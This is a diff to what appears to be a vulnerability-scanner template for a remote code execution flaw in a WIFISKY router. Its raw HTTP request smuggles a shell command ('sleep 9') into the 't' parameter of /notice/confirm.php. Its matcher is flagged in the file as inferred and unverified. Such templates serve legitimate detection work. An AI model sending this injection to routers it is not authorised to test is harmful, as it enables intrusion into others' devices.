@@ -3,13 +3,8 @@ info:
   name: WIFISKY7层流控路由器某接口存在RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/akozvy2x9mv3puu5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: akozvy2x9mv3puu5
 http:
 - raw:
   - 'GET /notice/confirm.php?t=;sleep%209 HTTP/1.1
@@ -51,12 +46,7 @@ http:
     Te: trailers
 
 
-    Connection: close
-
-
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717057397006-3ced9440-a44d-4ac4-9954-e0743d08b36d.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
